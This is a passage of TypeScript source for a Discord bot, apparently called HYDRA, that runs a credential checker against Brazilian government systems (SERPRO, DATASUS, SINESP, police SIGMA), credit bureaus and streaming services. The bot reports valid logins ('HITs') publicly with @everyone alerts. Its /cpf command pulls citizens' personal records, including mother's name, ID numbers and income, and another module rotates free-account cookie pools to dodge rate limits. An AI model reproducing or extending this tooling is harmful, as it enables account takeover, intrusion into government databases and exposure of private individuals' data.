    serpro: "SERPRO", sisreg: "SISREG III", credilink: "CrediLink", serasa: "Serasa",
    crunchyroll: "Crunchyroll", netflix: "Netflix", amazon: "Amazon Prime",
    hbomax: "HBO Max", disney: "Disney+", paramount: "Paramount+",
    sinesp: "SINESP Segurança", serasa_exp: "Serasa Experience",
    instagram: "Instagram", sispes: "SISP-ES", sigma: "SIGMA (PC-MA)",
    privacy: "Privacy.com.br",
    checkok: "CheckOK",
  }[target]!;
  const targetIcon    = {
    iseek: "🌐", datasus: "🏥", sipni: "💉",
    consultcenter: "📋", mind7: "🧠",
    serpro: "🛡️", sisreg: "🏨", credilink: "💳", serasa: "📊",
    crunchyroll: "🍥", netflix: "🎬", amazon: "📦",
    hbomax: "👑", disney: "🏰", paramount: "⭐",
    sinesp: "🚔", serasa_exp: "💼",
    instagram: "📸", sispes: "🏛️", sigma: "🔵",
    privacy: "🔒",
    checkok: "✅",
  }[target]!;
  const concurrency   = {
    iseek: 2, datasus: 2, sipni: 2, consultcenter: 3, mind7: 3,
    serpro: 4, sisreg: 2, credilink: 4, serasa: 2,
    crunchyroll: 4, netflix: 2, amazon: 2, hbomax: 4, disney: 3, paramount: 4,
    sinesp: 3, serasa_exp: 3,
    instagram: 2, sispes: 2, sigma: 3,
    privacy: 3,
    checkok: 5,
  }[target] ?? 2;

  // ── Stop + Hits buttons setup ─────────────────────────────────────────────
  const stopId  = `chk_stop_${Date.now()}`;
  const hitsId  = `chk_hits_${Date.now()}`;
  const stopAC  = new AbortController();
  const stopRow = new ActionRowBuilder<MessageActionRowComponentBuilder>().addComponents(
    new ButtonBuilder()
      .setCustomId(stopId)
      .setLabel("🛑 Parar")
      .setStyle(ButtonStyle.Danger),
    new ButtonBuilder()
      .setCustomId(hitsId)
      .setLabel("📋 Ver Hits Agora")
      .setStyle(ButtonStyle.Success),
  );

  // ── Acknowledge button + show initial progress embed ──────────────────────
  await btnInteraction.update({
    embeds: [new EmbedBuilder()
      .setColor(0xF1C40F)
      .setTitle(`${targetIcon} CHECKER AO VIVO — ${targetLabel}`)
      .setDescription(
        `${buildProgressBar(0, credentials.length)}\n\`0/${credentials.length}\` concluídas\n\n` +
        `✅ **0** HIT  |  ❌ **0** FAIL  |  ⚠️ **0** ERRO\n` +
        `⏱ **0s**  •  🔀 **${concurrency}x paralelo**\n\n` +
        `**Últimos resultados:**\n*Aguardando primeiros resultados...*`,
      )
      .setFooter({ text: `${AUTHOR} • ${targetLabel} • ● Processando...` })],
    components: [stopRow],
  });

  // ── Register stop button collector ────────────────────────────────────────
  const replyMsg = await interaction.fetchReply();
  // No time limit on collector — message edits via replyMsg.edit() never expire
  const stopCollector = replyMsg.createMessageComponentCollector({
    componentType: ComponentType.Button,
    filter: (b) => b.customId === stopId,
    time: 24 * 60 * 60_000, // 24h — effectively unlimited
    max: 1,
  });

  stopCollector.on("collect", async (btn) => {
    stopAC.abort("user_stop");
    await btn.deferUpdate().catch(() => void 0);
  });

  // ── "Ver Hits Agora" collector — can be clicked multiple times ────────────
  const hitsCollector = replyMsg.createMessageComponentCollector({
    componentType: ComponentType.Button,
    filter: (b) => b.customId === hitsId,
    time: 24 * 60 * 60_000,
  });

  hitsCollector.on("collect", async (btn) => {
    await btn.deferReply({ flags: MessageFlags.Ephemeral }).catch(() => void 0);
    const currentHits = liveState?.allResults?.filter(r => r.status === "HIT") ?? [];
    if (currentHits.length === 0) {
      await btn.editReply({ content: "❌ Nenhum HIT encontrado ainda." }).catch(() => void 0);
      return;
    }
    // Build partial TXT with all hit details
    const W = 66;
    const pad  = (s: string, w: number) => s + " ".repeat(Math.max(0, w - s.length));
    const line = (c: string) => c.repeat(W);
    const row  = (content: string) => `║ ${pad(content, W - 2)} ║`;
    const sep  = (l: string, m: string, r: string, f: string) => l + line(f) + r;
    const now  = new Date();
    const dt   = now.toLocaleDateString("pt-BR") + " às " + now.toLocaleTimeString("pt-BR", { hour: "2-digit", minute: "2-digit", second: "2-digit" });
    const done = liveState?.index ?? 0;
    const total = liveState?.total ?? 0;

    const txtLines: string[] = [
      sep("╔", "", "╗", "═"),
      row("  HYDRA — HITS PARCIAIS"),
      sep("╠", "", "╣", "═"),
      row(`  Alvo    : ${targetIcon} ${targetLabel}`),
      row(`  Data    : ${dt}`),
      row(`  Status  : ⏳ Em andamento — ${done}/${total} testadas`),
      sep("╠", "", "╣", "═"),
      row(`  ✅ HITs encontrados até agora: ${currentHits.length}`),
      sep("╚", "", "╝", "═"),
      "",
    ];

    const section = (title: string) => {
      const dashes = Math.max(0, Math.floor((W - title.length - 2) / 2));
      const left  = "─".repeat(dashes);
      const right = "─".repeat(W - dashes - title.length - 2);
      txtLines.push(`${left} ${title} ${right}`);
      txtLines.push("");
    };

    section(`✅  HITS (${currentHits.length})`);
    currentHits.forEach((r, i) => {
      txtLines.push(`[${String(i + 1).padStart(2, "0")}]  ${r.credential}`);
      txtLines.push(`      └─ ${r.detail ?? "—"}`);
      txtLines.push("");
    });
    txtLines.push(`${"─".repeat(W)}`);
    txtLines.push(`  ${AUTHOR}  •  Snapshot parcial`);

    const buf      = Buffer.from(txtLines.join("\n"), "utf-8");
    const snapName = `hits_parciais_${targetLabel.toLowerCase().replace(/[^a-z0-9]/g, "_")}_${Date.now()}.txt`;

    await btn.editReply({
      embeds: [new EmbedBuilder()
        .setColor(COLORS.GREEN)
        .setTitle(`📋 HITS PARCIAIS — ${targetIcon} ${targetLabel}`)
        .setDescription(
          `**${currentHits.length}** hit${currentHits.length === 1 ? "" : "s"} encontrado${currentHits.length === 1 ? "" : "s"} até agora ` +
          `(${done}/${total} testadas).\n\n` +
          currentHits.slice(0, 10).map((r, i) => {
            const cred = r.credential.length > 50 ? r.credential.slice(0, 47) + "…" : r.credential;
            const det  = r.detail?.length > 60    ? r.detail.slice(0, 57)     + "…" : (r.detail ?? "—");
            return `**${i + 1}.** \`${cred}\`\n> 📋 ${det}`;
          }).join("\n\n") +
          (currentHits.length > 10 ? `\n\n*...e mais ${currentHits.length - 10} no arquivo.*` : ""),
        )
        .setFooter({ text: `${AUTHOR} • arquivo completo abaixo` })],
      files: [new AttachmentBuilder(buf, { name: snapName })],
    }).catch(() => void 0);
  });

  // ── Live streaming with animated embed ────────────────────────────────────
  let liveState: LiveCheckerState | null = null;
  let embedDirty = false;

  const updateInterval = setInterval(async () => {
    if (!liveState || !embedDirty) return;
    embedDirty = false;
    const liveEmbed = buildLiveCheckerEmbed(liveState, targetLabel, targetIcon, concurrency);
    const components = liveState.done || liveState.stopped ? [] : [stopRow];
    // Use replyMsg.edit() — no 15-min interaction token expiry
    await replyMsg.edit({ embeds: [liveEmbed], components }).catch(() => void 0);
  }, 2000);

  let finalState: LiveCheckerState;
  try {
    finalState = await runStreamingChecker(credentials, target, (state) => {
      liveState  = state;
      embedDirty = true;

      const lastResult = state.allResults[state.allResults.length - 1];
      if (
        lastResult?.status === "HIT" &&
        lastResult.detail?.includes("/dashboard") &&
        !lastResult.detail?.toLowerCase().includes("expired") &&
        interaction.channel && "send" in interaction.channel
      ) {
        (interaction.channel as import("discord.js").TextChannel).send({
          content: `@everyone 🚨 **LOGIN ATIVO!** \`${lastResult.credential}\` — ${lastResult.detail}`,
          allowedMentions: { parse: ["everyone"] },
        }).catch(() => void 0);
      }
    }, stopAC);
  } catch (err) {
    clearInterval(updateInterval);
    stopCollector.stop();
    await replyMsg.edit({ embeds: [buildErrorEmbed("ERRO NO CHECKER", `Falha no streaming:\n\`${String(err)}\``)], components: [] });
    return;
  }

  clearInterval(updateInterval);
  stopCollector.stop();
  hitsCollector.stop();

  // ── Build TXT (needed for all exit paths) ────────────────────────────────
  const ts       = new Date().toISOString().replace(/[:.]/g, "-").slice(0, 19);
  const fileName = `checker_${targetLabel.toLowerCase().replace(/[^a-z0-9]/g, "_")}_${ts}.txt`;
  const txtBuf   = buildCheckerTxt(finalState.allResults, finalState, targetLabel, targetIcon, concurrency);

  // ── Save to history (always, including user-stop) ─────────────────────────
  lastCheckHistory.set(callerId, {
    txt:         txtBuf,
    fileName:    fileName,
    targetLabel: targetLabel,
    targetIcon:  targetIcon,
    ts:          new Date(),
    hitCount:    finalState.allResults.filter(r => r.status === "HIT").length,
    total:       finalState.total,
  });

  // ── Stopped early by user — send TXT and final embed ──────────────────────
  if (finalState.userStopped) {
    const stoppedEmbed = buildLiveCheckerEmbed(finalState, targetLabel, targetIcon, concurrency);
    const attachment   = new AttachmentBuilder(txtBuf, { name: fileName });
    await replyMsg.edit({ embeds: [stoppedEmbed], files: [attachment], components: [] }).catch(() => void 0);
    // Public hits announcement if any
    const stoppedHits = finalState.allResults.filter(r => r.status === "HIT");
    if (stoppedHits.length > 0 && interaction.channel && "send" in interaction.channel) {
      await (interaction.channel as import("discord.js").TextChannel)
        .send({
          content: `@everyone 🎯 **${stoppedHits.length} HIT(S)** encontrado(s) antes de parar — ${targetIcon} ${targetLabel}`,
          allowedMentions: { parse: ["everyone"] },
        }).catch(() => void 0);
    }
    return;
  }

  // ── Final results — summary embed + .txt attachment ──────────────────────
  const summaryEmbed = buildCheckerSummaryEmbed(finalState, targetLabel, targetIcon, concurrency);
  const attachment   = new AttachmentBuilder(txtBuf, { name: fileName });

  const editOk = await interaction.editReply({ embeds: [summaryEmbed], files: [attachment], components: [] })
    .catch(() => null);
  if (!editOk) {
    if (interaction.channel && "send" in interaction.channel) {
      await (interaction.channel as import("discord.js").TextChannel)
        .send({ embeds: [summaryEmbed], files: [attachment] })
        .catch(() => void 0);
    }
  }

  // ── Send hits-only .txt to channel (public) ───────────────────────────────
  const finalHits = finalState.allResults.filter(r => r.status === "HIT");
  if (finalHits.length > 0 && interaction.channel && "send" in interaction.channel) {
    const hitLines: string[] = [
      `✅ HITS — ${targetIcon} ${targetLabel}`,
      `${"─".repeat(50)}`,
      "",
      ...finalHits.map((r, i) => `[${String(i + 1).padStart(2, "0")}]  ${r.credential}\n      └─ ${r.detail ?? "—"}`),
      "",
      `${"─".repeat(50)}`,
      `${finalHits.length} hit(s) de ${finalState.total} testada(s)  •  ${AUTHOR}`,
    ];
    const hitsBuf  = Buffer.from(hitLines.join("\n"), "utf-8");
    const hitsFile = `hits_${targetLabel.toLowerCase().replace(/[^a-z0-9]/g, "_")}_${ts}.txt`;
    await (interaction.channel as import("discord.js").TextChannel)
      .send({
        content: `@everyone 🎯 **${finalHits.length} HIT(S)** encontrado(s) — ${targetIcon} ${targetLabel}`,
        files: [new AttachmentBuilder(hitsBuf, { name: hitsFile })],
        allowedMentions: { parse: ["everyone"] },
      }).catch(() => void 0);
  }
}

// ── Consulta ─────────────────────────────────────────────────────────────────
// ── /cpf handler ──────────────────────────────────────────────────────────────
async function handleCpf(interaction: ChatInputCommandInteraction): Promise<void> {
  await interaction.deferReply({ flags: MessageFlags.Ephemeral });

  const rawInput = interaction.options.getString("cpf", true).replace(/\D/g, "");
  if (rawInput.length !== 11) {
    await interaction.editReply({ embeds: [buildErrorEmbed("CPF INVÁLIDO", "Digite um CPF com 11 dígitos — pode ser formatado (`000.000.000-00`) ou só números.")] });
    return;
  }

  // Format CPF: 000.000.000-00
  const fmtCpf = `${rawInput.slice(0,3)}.${rawInput.slice(3,6)}.${rawInput.slice(6,9)}-${rawInput.slice(9)}`;

  let json: Record<string, unknown>;
  try {
    const r = await fetch(`${API_BASE}/api/cpf/${rawInput}`, { signal: AbortSignal.timeout(16_000) });
    json = await r.json() as Record<string, unknown>;
  } catch (e) {
    await interaction.editReply({ embeds: [buildErrorEmbed("ERRO DE CONSULTA", `Falha ao consultar o CPF: ${String(e).slice(0, 100)}`)] });
    return;
  }

  // API returned error
  if (json.error || (json.statusCode && json.statusCode !== 200)) {
    const msg = String(json.message ?? json.error ?? "CPF não encontrado ou inválido");
    await interaction.editReply({ embeds: [buildErrorEmbed("❌ CPF NÃO ENCONTRADO", msg)] });
    return;
  }

  if (json.status !== "success" || !json.resultado) {
    await interaction.editReply({ embeds: [buildErrorEmbed("⚠️ SEM DADOS", "Nenhuma informação disponível para este CPF.")] });
    return;
  }

  const dados = (json.resultado as Record<string, unknown>).dados as Record<string, unknown> ?? {};

  // ── Format helpers ──────────────────────────────────────────────────────────
  const v = (val: unknown, fallback = "—") => (val && String(val).trim() ? String(val).trim() : fallback);

  const sexoRaw = v(dados.SEXO, "");
  const sexo      = sexoRaw === "F" ? "♀️ Feminino" : sexoRaw === "M" ? "♂️ Masculino" : "—";
  const sexoEmoji = sexoRaw === "F" ? "♀️" : sexoRaw === "M" ? "♂️" : "❓";

  const rendaRaw = parseFloat(String(dados.RENDA ?? "0").replace(",", ".")) || 0;
  const rendaFmt = rendaRaw > 0
    ? `R$ ${rendaRaw.toLocaleString("pt-BR", { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`
    : "—";

  // ANSI block — CPF in bold green on Discord desktop / Vencord
  const ansiCpf = `\u001b[1;32m${fmtCpf}\u001b[0m`;
  const ansiNome = `\u001b[1;37m${v(dados.NOME)}\u001b[0m`;

  // ── Build embed ─────────────────────────────────────────────────────────────
  const embed = new EmbedBuilder()
    .setColor(0x4ade80)  // bright matrix-green accent
    .setAuthor({
      name: "🔍  LYZED DATABASE  •  CONSULTA CPF",
      iconURL: "https://media.tenor.com/9JqFEMlhATIAAAAj/hack-matrix.gif",
    })
    .setDescription(
      // Blockquote + ANSI code block
      `>>> \`\`\`ansi\n${ansiCpf}\n${ansiNome}\n\`\`\`\n` +
      `**${sexoEmoji} ${v(dados.NOME)}**\n` +
      `\`${fmtCpf}\`  ·  nascido em **${v(dados.NASC)}**  ·  ${sexo}`
    )
    .setThumbnail("https://media.tenor.com/wSMJ9UHO3ZYAAAAC/hacker.gif")
    .addFields(
      // ── Dados pessoais ─────────────────────────────────────────────────────
      { name: "⠀", value: "**▸ 📋 DADOS PESSOAIS**\n────────────────────────", inline: false },
      { name: "📅 Nascimento",     value: `\`${v(dados.NASC)}\``,       inline: true  },
      { name: "🚻 Sexo",           value: sexo,                          inline: true  },
      { name: "💰 Renda Estimada", value: `**${rendaFmt}**`,            inline: true  },

      // ── Família ────────────────────────────────────────────────────────────
      { name: "⠀", value: "**▸ 👨‍👩‍👧 FAMÍLIA**\n────────────────────────", inline: false },
      { name: "👩 Nome da Mãe",    value: `> ${v(dados.NOME_MAE)}`,     inline: false },

      // ── Documentos ─────────────────────────────────────────────────────────
      { name: "⠀", value: "**▸ 🗂️ DOCUMENTOS**\n────────────────────────", inline: false },
      { name: "🪪 RG",             value: `\`${v(dados.RG)}\``,         inline: true  },
      { name: "🗳️ Título Eleitor", value: `\`${v(dados.TITULO_ELEITOR)}\``, inline: true },
    )
    .setFooter({
      text: `${AUTHOR} • Lyzed Consulta  •  Dados obtidos em`,
    })
    .setTimestamp();

  await interaction.editReply({ embeds: [embed] });
}

async function handleConsulta(interaction: ChatInputCommandInteraction): Promise<void> {
  await interaction.deferReply({ flags: MessageFlags.Ephemeral });
  const sub = interaction.options.getSubcommand();

  // ── STATS ──────────────────────────────────────────────────────────────────
  if (sub === "stats") {
    let stats: QueryStats;
    try {
      stats = await api.queryStats();
    } catch (err) {
      await interaction.editReply({ embeds: [buildErrorEmbed("ERRO", `Falha ao buscar estatísticas: ${String(err)}`)] });
      return;
    }

    const situacaoLines = Object.entries(stats.situacao)
      .sort((a, b) => b[1] - a[1])
      .map(([s, n]) => `\`${s}\` — **${n.toLocaleString("pt-BR")}**`)
      .join("\n");

    const locaisLines = stats.topLocais
      .map((l, i) => `**${i + 1}.** ${l.local} — \`${l.count.toLocaleString("pt-BR")}\``)
      .join("\n");

    const embed = new EmbedBuilder()
      .setColor(COLORS.PURPLE)
      .setTitle("📊 BANCO DE DADOS — ESTATÍSTICAS")
      .setDescription(`*Total de registros:* **${stats.total.toLocaleString("pt-BR")}**`)
      .addFields(
        { name: "📋 Por Situação", value: situacaoLines || "—", inline: false },
        { name: "🏢 Top 10 Locais", value: locaisLines || "—", inline: false },
      )
      .setTimestamp()
      .setFooter({ text: AUTHOR });

    await interaction.editReply({ embeds: [embed] });
    return;
  }

  // ── Resolve query params ────────────────────────────────────────────────────
  let params: Parameters<typeof api.query>[0] = {};
  if (sub === "buscar")     params = { q:          interaction.options.getString("query", true) };
  if (sub === "nome")       params = { nome:       interaction.options.getString("nome",  true) };
  if (sub === "prontuario") params = { prontuario: interaction.options.getString("id",    true) };

  let result: QueryResult;
  try {
    result = await api.query(params);
  } catch (err) {
    await interaction.editReply({ embeds: [buildErrorEmbed("ERRO DE CONSULTA", `Falha ao consultar o banco: ${String(err)}`)] });
    return;
  }

  if (result.total === 0) {
    const embed = new EmbedBuilder()
      .setColor(COLORS.ORANGE)
      .setTitle("🔍 CONSULTA — NENHUM RESULTADO")
      .setDescription(`Nenhum registro encontrado para a busca:\n\`\`\`${JSON.stringify(params)}\`\`\`\n*Verifique o termo e tente novamente.*`)
      .setTimestamp()
      .setFooter({ text: AUTHOR });
    await interaction.editReply({ embeds: [embed] });
    return;
  }

  // ── Format results ──────────────────────────────────────────────────────────
  const formatSituacao = (s: string): string => {
    if (!s) return "❓ Desconhecida";
    if (s.toLowerCase().startsWith("ativo")) return `🟢 ${s}`;
    if (s.toLowerCase().startsWith("vencida")) return `🔴 ${s}`;
    return `🟡 ${s}`;
  };

  const formatRecord = (r: DbRecord, idx: number): string => {
    const lines = [
      `**${idx + 1}. ${r.nome || "—"}**`,
      `> 🆔 Prontuário: \`${r.prontuario || "—"}\``,
    ];
    if (r.cpf && r.cpf !== r.prontuario) lines.push(`> 📄 CPF: \`${r.cpf}\``);
    if (r.emissao)  lines.push(`> 📅 Emissão: \`${r.emissao}\``);
    if (r.validade) lines.push(`> ⏳ Validade: \`${r.validade}\``);
    lines.push(`> ${formatSituacao(r.situacao)}`);
    if (r.local)    lines.push(`> 📍 \`${r.local}\``);
    return lines.join("\n");
  };

  // Split into pages of up to 5 records per embed field (Discord 4096 char limit)
  const PAGE_SIZE = 5;
  const pages     = Math.ceil(result.results.length / PAGE_SIZE);
  const embeds: EmbedBuilder[] = [];

  for (let p = 0; p < pages; p++) {
    const slice = result.results.slice(p * PAGE_SIZE, (p + 1) * PAGE_SIZE);
    const description = p === 0
      ? `🔍 **${result.total}** resultado${result.total === 1 ? "" : "s"} encontrado${result.total === 1 ? "" : "s"}` +
        (result.total > 25 ? ` (exibindo os primeiros 25)` : "") +
        `\n\n` + slice.map((r, i) => formatRecord(r, p * PAGE_SIZE + i)).join("\n\n")
      : slice.map((r, i) => formatRecord(r, p * PAGE_SIZE + i)).join("\n\n");

    const embed = new EmbedBuilder()
      .setColor(result.total === 1 ? COLORS.GREEN : COLORS.PURPLE)
      .setTitle(p === 0 ? "🔍 CONSULTA — RESULTADOS" : `🔍 CONSULTA — PÁGINA ${p + 1}`)
      .setDescription(description.slice(0, 4096))
      .setTimestamp()
      .setFooter({ text: `${AUTHOR} • ${result.total} registro${result.total === 1 ? "" : "s"}` });

    embeds.push(embed);
  }

  // Discord allows up to 10 embeds per message
  await interaction.editReply({ embeds: embeds.slice(0, 10) });
}

// ── /sky — SKYNETchat direct interface ────────────────────────────────────────
async function handleSky(interaction: ChatInputCommandInteraction): Promise<void> {
  const sub = interaction.options.getSubcommand();

  // ── /sky status ─────────────────────────────────────────────────────────────
  if (sub === "status") {
    const configured = isSkynetConfigured();

    if (!configured) {
      await interaction.reply({
        embeds: [
          new EmbedBuilder()
            .setColor(COLORS.RED)
            .setTitle("🛰️ SKYNETCHAT — NÃO CONFIGURADO")
            .setDescription(
              "**`SKYNETCHAT_COOKIE` não está definido no ambiente.**\n\n" +
              "Para ativar:\n" +
              "1. Faça login em https://skynetchat.net no seu navegador\n" +
              "2. Abra DevTools → Application → Cookies → `skynetchat.net`\n" +
              "3. Copie todos os pares `nome=valor; nome2=valor2`\n" +
              "4. Defina como segredo `SKYNETCHAT_COOKIE` no painel do Replit"
            )
            .setFooter({ text: AUTHOR })
            .setTimestamp(),
        ],
        flags: MessageFlags.Ephemeral,
      });
      return;
    }

    // Quick connectivity test with a minimal message
    await interaction.deferReply({ flags: MessageFlags.Ephemeral });
    const start = Date.now();
    let testReply: string | null = null;
    let testRateLimit = false;
    try {
      testReply = await askSkynet([{ role: "user", content: "Diga apenas: online" }]);
    } catch (e) {
      if (e instanceof SkynetRateLimitError) testRateLimit = true;
    }
    const elapsed = Date.now() - start;

    // Rate limited = all accounts exhausted
    if (testRateLimit) {
      const pool = getSkynetPoolStatus();
      await interaction.editReply({
        embeds: [
          new EmbedBuilder()
            .setColor(COLORS.GOLD)
            .setTitle("🛰️ SKYNETCHAT — LIMITE ATINGIDO (rotação em curso)")
            .setDescription(
              "Todas as contas ativas atingiram o limite de mensagens gratuitas.\n" +
              "O bot vai criar uma nova conta automaticamente na próxima pergunta."
            )
            .addFields(
              { name: "📦 Pool de contas", value: `Total: **${pool.total}** | Ativas: **${pool.active}** | Limitadas: **${pool.limited}**`, inline: false },
              { name: "📡 Endpoints", value: "`chat-V3` · `chat-V2-fast` · `chat-V2-thinking` · `chat-V3-thinking`", inline: false },
            )
            .setFooter({ text: AUTHOR })
            .setTimestamp(),
        ],
      });
      return;
    }

    if (!testReply) {
      await interaction.editReply({
        embeds: [
          new EmbedBuilder()
            .setColor(COLORS.ORANGE)
            .setTitle("🛰️ SKYNETCHAT — COOKIE EXPIRADO OU ERRO")
            .setDescription(
              "O `SKYNETCHAT_COOKIE` está definido mas a API não respondeu.\n\n" +
              "**Possíveis causas:**\n" +
              "• Cookie de sessão expirado (faça login novamente)\n" +
              "• Cloudflare bloqueando requisições do servidor\n" +
              "• SKYNETchat offline / em manutenção"
            )
            .setFooter({ text: AUTHOR })
            .setTimestamp(),
        ],
      });
      return;
    }

    const pool  = getSkynetPoolStatus();
    const queue = getQueueStatus();
    await interaction.editReply({
      embeds: [
        new EmbedBuilder()
          .setColor(COLORS.GREEN)
          .setTitle("🛰️ SKYNETCHAT — ONLINE ✅")
          .setDescription(`**Latência:** \`${elapsed}ms\`\n**Resposta de teste:** ${testReply.slice(0, 200)}`)
          .addFields(
            { name: "📦 Pool de contas",       value: `Total: **${pool.total}** | Ativas: **${pool.active}** | Limitadas: **${pool.limited}**`,          inline: false },
            { name: "⚡ Fila de requisições",  value: `Processando: **${queue.running}/${queue.maxConcurrent}** | Aguardando: **${queue.waiting}**`,      inline: false },
            { name: "📡 Endpoints disponíveis", value: "`chat-V3` · `chat-V2-fast` · `chat-V2-thinking` · `chat-V3-thinking`",                           inline: false },
            { name: "💬 Como usar",             value: "`/sky ask message:<sua pergunta>`",                                                                inline: false },
          )
          .setFooter({ text: AUTHOR })
          .setTimestamp(),
      ],
    });
    return;
  }

  // ── /sky add-account ─────────────────────────────────────────────────────────
  if (sub === "add-account") {
    const nid = interaction.options.getString("nid", true).trim();
    const sid = interaction.options.getString("sid", true).trim();

    await interaction.deferReply({ flags: MessageFlags.Ephemeral });
    const result = await addAccountToPool(nid, sid);
    const pool   = getSkynetPoolStatus();

    if (result.ok) {
      await interaction.editReply({
        embeds: [
          new EmbedBuilder()
            .setColor(COLORS.GREEN)
            .setTitle("🛰️ SKYNETCHAT — Conta adicionada ✅")
            .setDescription("Cookie validado com sucesso e conta adicionada ao pool!")
            .addFields(
              { name: "📦 Pool de contas", value: `Total: **${pool.total}** | Ativas: **${pool.active}** | Limitadas: **${pool.limited}**`, inline: false },
              { name: "💡 Como criar mais contas", value: "1. Acesse https://skynetchat.net/sign-up\n2. Crie uma conta\n3. Abra DevTools → Application → Cookies\n4. Copie `nid` e `sid`\n5. Use `/sky add-account`", inline: false },
            )
            .setFooter({ text: AUTHOR })
            .setTimestamp(),
        ],
      });
    } else {
      const reasons: Record<string, string> = {
        already_exists: "Essa conta já está no pool.",
        invalid_cookie: "Cookie inválido — `nid` ou `sid` incorretos ou expirados.",
        no_user: "Sessão não retornou usuário. Cookie pode estar expirado.",
      };
      await interaction.editReply({
        embeds: [
          new EmbedBuilder()
            .setColor(COLORS.RED)
            .setTitle("🛰️ SKYNETCHAT — Erro ao adicionar conta")
            .setDescription(reasons[result.reason ?? ""] ?? `Falha: \`${result.reason}\``)
            .setFooter({ text: AUTHOR })
            .setTimestamp(),
        ],
      });
    }
    return;
  }

  // ── /sky ask ─────────────────────────────────────────────────────────────────
  if (sub === "ask") {
    const userId  = interaction.user.id;
    const message = interaction.options.getString("message", true);

    // ── Rate limit check (before deferring so ephemeral reply works) ────────
    const rlMs = getRateLimitRemaining(userId);
    if (rlMs > 0) {
      const secsLeft = Math.ceil(rlMs / 1000);
      await interaction.reply({
        embeds: [
          new EmbedBuilder()
            .setColor(COLORS.ORANGE)
            .setTitle("🛰️ SKYNETCHAT — AGUARDE")
            .setDescription(
              `⏳ **Você usou o \`/sky\` recentemente.**\n\n` +
              `> Aguarde mais **${secsLeft}s** antes de enviar outra pergunta.\n\n` +
              `*O rate limit existe para não esgotar os tokens da conta.*`
            )
            .setFooter({ text: AUTHOR })
            .setTimestamp(),
        ],
        flags: MessageFlags.Ephemeral,
      }).catch(() => {});
      return;
    }

    // ── Defer IMMEDIATELY — Discord requires acknowledgement within 3s ──────
    const deferOk = await interaction.deferReply().then(() => true).catch(() => false);
    if (!deferOk) return;

    // Safe wrapper: catches AbortError / network hiccups on editReply
    const safeEdit = async (opts: Parameters<typeof interaction.editReply>[0]): Promise<void> => {
      try {
        await interaction.editReply(opts);
      } catch (editErr) {
        console.error("[SKY ASK] editReply failed:", editErr instanceof Error ? editErr.message : editErr);
      }
    };

    if (!isSkynetConfigured()) {
      await safeEdit({
        embeds: [
          new EmbedBuilder()
            .setColor(COLORS.RED)
            .setTitle("🛰️ SKYNETCHAT — NÃO CONFIGURADO")
            .setDescription("O segredo `SKYNETCHAT_COOKIE` não está definido.\nUse `/sky status` para ver as instruções de configuração.")
            .setFooter({ text: AUTHOR }),
        ],
      });
      return;
    }

    const endpoint    = (interaction.options.getString("model") ?? "chat-V3") as Parameters<typeof askSkynet>[1];
    const qPreview    = message.length > 220 ? message.slice(0, 217) + "…" : message;
    const geassFile   = new AttachmentBuilder(
      path.join(path.dirname(new URL(import.meta.url).pathname), "..", "assets", "geass-symbol.png"),
      { name: "geass-symbol.png" }
    );

    // ── Build live queue embed ───────────────────────────────────────────────
    const BAR_LEN = 12;
    const buildQueueEmbed = (pos: QueuePosition): EmbedBuilder => {
      if (pos.isRunning) {
        return new EmbedBuilder()
          .setColor(COLORS.GOLD)
          .setTitle("🛰️  S K Y N E T C H A T")
          .setDescription(
            `> 💬 **${qPreview}**\n\n` +
            `━━━━━━━━━━━━━━━━━━━━━━\n\n` +
            `**⚡ Sua vez! Processando requisição...**\n\n` +
            `> A IA está gerando sua resposta, aguarde.`
          )
          .setThumbnail("attachment://geass-symbol.png")
          .setFooter({ text: `${AUTHOR}  •  ${endpoint}` })
          .setTimestamp();
      }
      const totalWaiting = pos.total - pos.running;
      const filled = Math.max(1, BAR_LEN - Math.round(((pos.waitPos - 1) / Math.max(totalWaiting - 1, 1)) * BAR_LEN));
      const bar = `\`[${"█".repeat(filled)}${"░".repeat(BAR_LEN - filled)}]\``;
      return new EmbedBuilder()
        .setColor(COLORS.PURPLE)
        .setTitle("🛰️  S K Y N E T C H A T  —  FILA")
        .setDescription(
          `> 💬 **${qPreview}**\n\n` +
          `━━━━━━━━━━━━━━━━━━━━━━\n\n` +
          `📋 **Você está na fila de requisições**\n\n` +
          `> 🎫 Posição: **#${pos.waitPos}** de ${totalWaiting} aguardando\n` +
          `> 👥 À sua frente: **${pos.ahead}**\n` +
          `> ⚡ Processando agora: **${pos.running}**\n\n` +
          `${bar}  \`${pos.waitPos}/${totalWaiting}\`\n\n` +
          `*Aguarde sua vez — a resposta chegará em breve...*`
        )
        .setThumbnail("attachment://geass-symbol.png")
        .setFooter({ text: `${AUTHOR}  •  SkyNet Queue  •  ${endpoint}` })
        .setTimestamp();
    };

    // ── Enqueue and show live position updates ───────────────────────────────
    let isFirstUpdate = true;
    const start = Date.now();
    let reply: string | null = null;
    let errorMsg = "";
    let isRateLimit = false;

    try {
      reply = await enqueueRequest(
        userId,
        () => askSkynet([{ role: "user", content: message }], endpoint),
        async (pos) => {
          if (isFirstUpdate) {
            // Include the geass attachment only on the first edit (sets thumbnail)
            await safeEdit({ embeds: [buildQueueEmbed(pos)], files: [geassFile] });
            isFirstUpdate = false;
          } else {
            await safeEdit({ embeds: [buildQueueEmbed(pos)] });
          }
        },
      );
    } catch (e) {
      if (e instanceof SkynetRateLimitError) {
        isRateLimit = true;
      } else {
        errorMsg = e instanceof Error ? e.message : String(e);
      }
    }

    const elapsed = Date.now() - start;
    const modelLabel = endpoint ? ({ "chat-V3": "SKY v3", "chat-V2-fast": "SKY v2 Fast", "chat-V2-thinking": "SKY v2 Think", "chat-V3-thinking": "SKY v3 Think" } as Record<string, string>)[endpoint] ?? endpoint : "SKY";

    if (isRateLimit) {
      await safeEdit({
        embeds: [
          new EmbedBuilder()
            .setColor(COLORS.ORANGE)
            .setTitle("🛰️ SKYNETCHAT — LIMITE ATINGIDO")
            .setDescription(
              "**A conta gratuita do SKYNETchat esgotou o limite de mensagens.**\n\n" +
              "**O que fazer:**\n" +
              "• Aguarde o reset do limite (geralmente diário)\n" +
              "• Ou assine o plano PRO em https://skynetchat.net\n\n" +
              "> O cookie continua válido — nenhuma reconfiguração necessária."
            )
            .setFooter({ text: `${AUTHOR}  •  ${modelLabel}  •  ${elapsed}ms` })
            .setTimestamp(),
        ],
      });
      return;
    }

    if (!reply) {
      await safeEdit({
        embeds: [
          new EmbedBuilder()
            .setColor(COLORS.RED)
            .setTitle("🛰️ SKYNETCHAT — FALHA")
            .setDescription(
              errorMsg
                ? `**Erro:** \`${errorMsg.slice(0, 300)}\``
